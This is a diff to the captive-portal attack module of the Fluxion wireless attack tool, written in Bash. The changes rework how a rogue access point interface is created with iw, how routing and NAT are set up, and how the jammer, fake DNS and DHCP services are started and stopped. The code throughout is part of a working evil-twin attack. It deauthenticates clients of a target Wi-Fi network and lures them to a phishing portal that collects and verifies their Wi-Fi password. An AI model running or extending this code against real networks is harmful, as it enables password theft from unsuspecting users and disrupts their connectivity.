@@ -15,11 +15,110 @@ CaptivePortalAuthenticationMethodsInfo=("(handshake file, ${CGrn}recommended$CCl
 VIGWAddress="192.168.254.1"
 VIGWNetwork=${VIGWAddress%.*}
 
+function captive_portal_unset_interface() {
+	if [ ! "$WIAccessPoint" ]; then return 1; fi
+
+	if interface_is_wireless "$WIAccessPoint"
+		then fluxion_unset_ap_service
+	fi
+
+	if [ "$WIAccessPoint" = "FX${WIMonitor:2}AP" ]; then
+		# Remove any previously created fluxion AP interfaces.
+		iw dev "$WIAccessPoint" del &> $FLUXIONOutputDevice
+	fi
+
+	WIAccessPoint=""
+}
+
+function captive_portal_set_interface() {
+	if [ "$WIAccessPoint" ]; then return 0; fi
+
+	captive_portal_unset_interface
+
+	# Gather candidate interfaces.
+	echo -e "$FLUXIONVLine $FLUXIONFindingWINotice"
+
+	# List of all valid network interfaces.
+	interface_list_real
+
+	local ifAlternate=("$FLUXIONGeneralRepeatOption" "$FLUXIONGeneralBackOption")
+	local ifAlternateInfo=("" "")
+	local ifAlternateState=("" "")
+	local ifAlternateColor=("$CClr" "$CClr")
+
+	interface_prompt "$FLUXIONVLine $CaptivePortalInterfaceQuery" InterfaceListReal[@] \
+	ifAlternate[@] ifAlternateInfo[@] ifAlternateState[@] ifAlternateColor[@]
+
+	case "$InterfacePromptIfSelected" in
+		"$FLUXIONGeneralBackOption")
+			captive_portal_unset_interface; fluxion_unset_attack; return 1;;
+
+		# If the monitor interface is also the AP interface,
+		# there's no need to reserve it again, just add it.
+		"$WIMonitor")
+			if ! captive_portal_run_interface "$InterfacePromptIfSelected"
+				then return 1
+			fi
+
+			WIAccessPoint="$CaptivePortalRunInterface";;
+		*)
+			# We'll only attempt to run wireless interfaces for now.
+			# The conditional below is a temporary fix for ethernet interfaces.
+			# TODO: Fix fluxion_run_interface to accept non-wireless interfaces.
+			if interface_is_wireless "$InterfacePromptIfSelected"; then
+				if ! fluxion_run_interface "$InterfacePromptIfSelected"
+					then return 2
+				fi
+
+				WIAccessPoint="$FluxionRunInterface"
+			else
+				WIAccessPoint="$InterfacePromptIfSelected"
+			fi;;
+	esac
+
+	VIGW=$WIAccessPoint
+	VIAP=$WIAccessPoint
+
+	# Set an AP service if the interface selected is wireless.
+	if interface_is_wireless "$WIAccessPoint"; then
+		if ! fluxion_set_ap_service
+			then captive_portal_unset_interface; return 1
+		fi
+	fi
+}
+
+function captive_portal_run_interface() {
+	if [ ! "$1" ]; then return 1; fi
+
+	# Create an identifier for the access point, AP virtual interface.
+	local wiAccessPoint="FX${1:2}AP"
+
+	# Find interface's physical device.
+	if ! interface_physical "$1"
+		then echo -e "$FLUXIONVLine $FLUXIONPhysicalWIDeviceUnknownError"; sleep 5; return 1
+	fi
+
+	local wiAccessPointDevice="$InterfacePhysical"
+
+	# Create the new virtual interface with the generated identifier.
+	echo -e "$FLUXIONVLine $CaptivePortalStartingInterfaceNotice"
+	if ! iw phy $wiAccessPointDevice interface add $wiAccessPoint type monitor 2> $FLUXIONOutputDevice; then
+		echo -e "$FLUXIONVLine $CaptivePortalCannotStartInterfaceError"
+		sleep 5
+		return 3
+	fi
+
+	echo -e "$FLUXIONVLine $CaptivePortalStartedInterfaceNotice"
+	sleep 3
+
+	CaptivePortalRunInterface="$wiAccessPoint"
+}
+
 function captive_portal_unset_auth() {
 	if [ ! "$APRogueAuthMode" ]; then return 0; fi
 
 	if [ "$APRogueAuthMode" = "hash" ]; then
-		unset_hash
+		fluxion_unset_hash
 	fi
 
 	APRogueAuthMode=""
@@ -28,7 +127,7 @@ function captive_portal_unset_auth() {
 	# section by taking that one option, so we unset the previous
 	# phase along with this one to take the user properly back.
 	if [ ${#CaptivePortalAuthenticationMethods[@]} -le 1 ]; then
-		unset_ap_service
+		captive_portal_unset_interface
 	fi
 }
 
@@ -49,7 +148,7 @@ function captive_portal_set_auth() {
 		echo -e "$FLUXIONVLine $CaptivePortalVerificationMethodQuery"
 		echo
 
-		view_target_ap_info
+		fluxion_show_ap_info "$APTargetSSID" "$APTargetEncryption" "$APTargetChannel" "$APTargetMAC" "$APTargetMaker"
 
 		local choices=("${CaptivePortalAuthenticationMethods[@]}" "$FLUXIONGeneralBackOption")
 		io_query_format_fields "" "\t$CRed[$CYel%d$CRed]$CClr %b %b\n" choices[@] \
@@ -60,14 +159,13 @@ function captive_portal_set_auth() {
 		APRogueAuthMode="${IOQueryFormatFields[0]}"
 
 		if [[ "$APRogueAuthMode" = "$FLUXIONGeneralBackOption" ]]; then
-			unset_ap_service
 			captive_portal_unset_auth
 			return 1
 		fi
 	fi
 
 	if [ "$APRogueAuthMode" = "hash" ]; then
-		set_hash
+		fluxion_set_hash
 	fi
 
 	if [[ $? -ne 0 ]]; then captive_portal_unset_auth; return 1; fi
@@ -162,11 +260,11 @@ function captive_portal_set_site() {
 
 	fluxion_header
 
-	echo -e "$FLUXIONVLine $CaptivePortalInterfaceQuery"
+	echo -e "$FLUXIONVLine $CaptivePortalUIQuery"
 
 	echo
 
-	view_target_ap_info
+	fluxion_show_ap_info "$APTargetSSID" "$APTargetEncryption" "$APTargetChannel" "$APTargetMAC" "$APTargetMaker"
 
 	io_query_format_fields "" "$queryFieldOptionsFormat\n" \
 						   sitesIdentifier[@] sitesLanguage[@]
@@ -201,16 +299,18 @@ function captive_portal_unset_attack() {
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal/check.php"
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal"
 
-	# Only reset the AP if one has been defined.	
-	if [ $(type -t ap_reset) ]; then
-		ap_reset
+	# Only reset the AP if one has been defined.
+	if [ "$APRogueService" -a "`type -t ap_reset`" ]
+		then ap_reset
 	fi
 }
 
 # Create different settings required for the script
 function captive_portal_set_attack() {
 	# AP Service: Prepare service for an attack.
-	ap_prep
+	if [ "$APRogueService" ]
+		then ap_prep
+	fi
 
 	# Add the PHP authenticator scripts, used to verify
 	# password attempts from users using the web interface.
@@ -718,16 +818,16 @@ function captive_portal_unset_routes() {
 		sysctl -w net.ipv4.ip_forward=$(cat "$FLUXIONWorkspacePath/ip_forward") &> $FLUXIONOutputDevice
 		sandbox_remove_workfile "$FLUXIONWorkspacePath/ip_forward"
 	fi
+
+	ip addr del $VIGWAddress/24 dev $VIGW 2> /dev/null
 }
 
 # Set up DHCP / WEB server
 # Set up DHCP / WEB server
 function captive_portal_set_routes() {
-	# Give an address to the gateway interface in the network.
-	ifconfig $VIGW $VIGWAddress netmask 255.255.255.0
-
-	# Add a route to the virtual gateway interface.
-	route add -net $VIGWNetwork.0 netmask 255.255.255.0 gw $VIGWAddress
+	# Give an address to the gateway interface in the rogue network.
+	# This makes the interface accessible from the rogue network.
+	ip addr add $VIGWAddress/24 dev $VIGW
 
 	# Save the system's routing state to restore later.
 	cp "/proc/sys/net/ipv4/ip_forward" "$FLUXIONWorkspacePath/ip_forward"
@@ -750,18 +850,56 @@ function captive_portal_set_routes() {
 	iptables -t nat -A POSTROUTING -j MASQUERADE
 }
 
+function captive_portal_stop_interface() {
+	captive_portal_unset_routes
+
+	if [ "$APRogueService" ]
+		then ap_stop
+	fi
+}
+
+function captive_portal_start_interface() {
+	if [ "$APRogueService" ]; then
+		echo -e "$FLUXIONVLine $CaptivePortalStaringAPServiceNotice"
+		ap_start
+	else
+		fluxion_header
+
+		echo -e "$FLUXIONVLine Configuration for external access point device:"
+		echo
+
+		fluxion_show_ap_info "$APRogueSSID" "OPEN" "$APTargetChannel" "$APRogueMAC" "$APTargetMaker"
+
+		echo -e "$FLUXIONVLine IPv4 Address: ${VIGWAddress%.*}.2/24"
+		echo -e "$FLUXIONVLine IPv6 Address: Disabled"
+		echo -e "$FLUXIONVLine  DHCP Server: $VIGWAddress"
+		echo -e "$FLUXIONVLine   DNS Server: $VIGWAddress"
+		echo
+
+		echo -e "$FLUXIONVLine ${CYel}Assure external AP device is available & configured before continuing!${CClr}"
+		read -n1 -p "Press any key to continue... " bullshit
+	fi
+
+	echo -e "$FLUXIONVLine $CaptivePortalStaringAPRoutesNotice"
+	captive_portal_set_routes &
+	sleep 3
+
+    fuser -n tcp -k 53 67 80 443 &> $FLUXIONOutputDevice
+    fuser -n udp -k 53 67 80 443 &> $FLUXIONOutputDevice
+}
+
 function unprep_attack() {
 	CaptivePortalState="Not Ready"
 	captive_portal_unset_attack
 	captive_portal_unset_site
 	captive_portal_unset_cert
 	captive_portal_unset_auth
-	unset_ap_service
+	captive_portal_unset_interface
 }
 
 function prep_attack() {
 	while true; do
-		set_ap_service; 				if [ $? -ne 0 ]; then break; fi
+		captive_portal_set_interface; 	if [ $? -ne 0 ]; then break; fi
 		captive_portal_set_auth; 		if [ $? -ne 0 ]; then continue; fi
 		captive_portal_set_cert; 		if [ $? -ne 0 ]; then continue; fi
 		captive_portal_set_site; 		if [ $? -ne 0 ]; then continue; fi
@@ -786,8 +924,8 @@ function stop_attack() {
 
 	killall mdk3 &> $FLUXIONOutputDevice
 	local FLUXIONJammer=$(ps a | grep -e "FLUXION AP Jammer" | awk '{print $1'})
-	if [ "$FLUXIONJammer" ]; then
-		kill $FLUXIONJammer &> $FLUXIONOutputDevice
+	if [ "$FLUXIONJammer" ]
+		then kill $FLUXIONJammer &> $FLUXIONOutputDevice
 	fi
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk3_blacklist.lst"
 
@@ -799,20 +937,18 @@ function stop_attack() {
 
 	# Kill python DNS service if one is found.
 	local FLUXIONDNS=$(ps a | grep -e "FLUXION AP DNS" | awk '{print $1'})
-	if [ "$FLUXIONDNS" ]; then
-		kill $FLUXIONDNS &> $FLUXIONOutputDevice
+	if [ "$FLUXIONDNS" ]
+		then kill $FLUXIONDNS &> $FLUXIONOutputDevice
 	fi
 
 	# Kill DHCP service.
 	local FLUXIONDHCP=$(ps a | grep -e "FLUXION AP DHCP" | awk '{print $1'})
-	if [ "$FLUXIONDHCP" ]; then
-		kill $FLUXIONDHCP &> $FLUXIONOutputDevice
+	if [ "$FLUXIONDHCP" ]
+		then kill $FLUXIONDHCP &> $FLUXIONOutputDevice
 	fi
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/clients.txt"
 
-	captive_portal_unset_routes
-
-	ap_stop
+	captive_portal_stop_interface
 }
 
 function start_attack() {
@@ -820,15 +956,7 @@ function start_attack() {
 
 	stop_attack
 
-	echo -e "$FLUXIONVLine $CaptivePortalStaringAPServiceNotice"
-	ap_start
-
-	echo -e "$FLUXIONVLine $CaptivePortalStaringAPRoutesNotice"
-	captive_portal_set_routes &
-	sleep 3
-
-    fuser -n tcp -k 53 67 80 443 &> $FLUXIONOutputDevice
-    fuser -n udp -k 53 67 80 443 &> $FLUXIONOutputDevice
+	captive_portal_start_interface
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
 	xterm -bg black -fg green $TOPLEFT -title "FLUXION AP DHCP Service" -e "dhcpd -d -f -lf \"$FLUXIONWorkspacePath/dhcpd.leases\" -cf \"$FLUXIONWorkspacePath/dhcpd.conf\" $VIGW 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\"" &
